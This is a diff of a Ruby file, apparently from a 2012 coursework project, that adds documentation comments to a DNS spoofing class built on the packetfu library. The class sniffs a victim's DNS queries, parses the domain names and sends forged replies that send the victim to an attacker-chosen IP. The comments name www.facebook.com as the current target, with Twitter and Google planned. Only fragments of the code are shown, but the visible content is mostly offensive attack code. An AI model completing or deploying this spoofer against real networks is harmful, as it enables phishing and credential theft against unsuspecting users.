@@ -1,9 +1,43 @@
 #!/usr/bin/env ruby
+
+#-------------------------------------------------------------------------------
+# dns.rb
+#
+# DNS Spoofing Class
+#
+# Author: Karl Castillo
+#
+# Date: October 26, 2012
+#
+# Functions:
+# initialize - initialize the class
+# start - start spoofing
+#
+# Revisions: (Date and Description)
+#
+# Notes:
+#
+#-------------------------------------------------------------------------------
 require 'rubygems'
 require 'packetfu'
+require './spoof.rb'
 
-class DNSSPoofer
-    
+class DNSSPoofer < Spoof
+
+    #---------------------------------------------------------------------------
+    # initialize
+    #
+    # Initialization of the DNSSpoofer Class
+    #
+    # spoof_ip - the IP address where the victim will be sent to
+    # victim_ip - Victim's IP
+    # iface - NIC Device (default = "em1")
+    # spoof - true to start spoofing, false to not start (default = false)
+    #
+    # Revision: (Date and Description)
+    #
+    # Notes:
+    #---------------------------------------------------------------------------    
     def initialize(spoof_ip, victim_ip, iface = "em1", spoof = false)
         @spoof_ip = spoof_ip
         @victim_ip = victim_ip
@@ -15,10 +49,19 @@ class DNSSPoofer
         end
     end # initalize
     
-    def send(packet)
-        packet.to_w(@interface)
-    end # send(packet)
+    #def send(packet)
+    #    packet.to_w(@interface)
+    #end # send(packet)
     
+    #---------------------------------------------------------------------------
+    # start
+    #
+    # Start DNS spoofing
+    #
+    # Revisions: (Date and Description)
+    #
+    # Notes:
+    #---------------------------------------------------------------------------
     def start
         # Check if already spoofing
         if running then
@@ -42,7 +85,7 @@ class DNSSPoofer
             
             # Check if Query
             if @packet.payload[2] == 1 && @packet.payload[3] == 0 then
-                @domain_name = get_domain(@packet.payload[12..-1]
+                @domain_name = get_domain(@packet.payload[12..-1])
                 
                 # Check if domain name field is empty
                 if domain_name.nil? then
@@ -55,9 +98,21 @@ class DNSSPoofer
                 
             end # if(@packet.payload[2] == 1 && @packet.payload[3] == 0
         end # cap stream.each do |pkt|
-        
     end # start
     
+    #---------------------------------------------------------------------------
+    # get_domain
+    #
+    # Parse the DNS header and turn the domain name to a string
+    #
+    # payload - the payload of the DNS header
+    #
+    # returns domain name as a string
+    #
+    # Revisions: (Date and Description)
+    #
+    # Notes:
+    #---------------------------------------------------------------------------
     def get_domain(payload)
         domain_name = ""
         while(true)
@@ -73,6 +128,21 @@ class DNSSPoofer
         end # while(true)
     end # get_domain(payload)
     
+    #---------------------------------------------------------------------------
+    # send_response
+    #
+    # Create a DNS response packet and send it back to the victim
+    #
+    # Revisions: (Date and Description)
+    #
+    # Notes:
+    # Current websites being spoofed:
+    #   ~ www.facebook.com
+    #
+    # To be implemented:
+    #   ~ www.twitter.com
+    #   ~ www.google.ca
+    #---------------------------------------------------------------------------
     def send_response
         cfg = PacketFu::Utils.whoami?(:iface => @interface)
         
